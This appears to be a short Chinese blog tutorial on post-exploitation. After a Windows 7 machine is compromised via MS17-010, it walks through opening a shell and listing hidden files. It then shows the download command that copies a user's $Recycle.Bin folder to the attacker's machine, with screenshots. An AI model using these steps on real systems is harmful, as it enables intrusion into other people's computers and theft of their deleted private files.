---
title: 渗透查看win7回收站内容
tags:
  - 渗透
  - 入侵
categories:
  - Linux
  - Kali
  - 其他
keywords:
  - win7
  - 回收站
cover: https://pic.netbian.com/uploads/allimg/211216/000848-1639584528e11a.jpg
abbrlink: 2
---






## 查看回收站内容

使用ms17_010渗透入侵win7

输入命令shell

```
shell
```

![](https://www.helloimg.com/images/2021/12/20/G0RF7r.png)

图片进入是乱码可以输入chcp 65001 修改编码

```
chcp 65001
```

![](https://www.helloimg.com/images/2021/12/20/G0R3wK.png)

进入C盘根目录

```
cd /
```

![](https://www.helloimg.com/images/2021/12/20/G0RxWD.png)

查看隐藏文件

```
dir /a
```

![](https://www.helloimg.com/images/2021/12/20/G0RmaC.png)

图中的$Recycle.Bin为回收站文件



进入$Recycle.Bin

```
cd $Recycle.Bin
```

![](https://www.helloimg.com/images/2021/12/20/G0RACu.png)

一样输入dir /a查看隐藏文件

```
dir /a
```

![](https://www.helloimg.com/images/2021/12/20/G0RS0E.png)

复制最后一个将他下载出来

```
download C:\\$Recycle.Bin\\S-1-5-21-2751780912-401806805-1882313462-500
```

![](https://www.helloimg.com/images/2021/12/20/G0Rb9X.png)



进入下载的目录即可查看回收站的文件（根据下载信息我的是在桌面下的python文件夹里）

![](https://www.helloimg.com/images/2021/12/20/G0RWD6.png)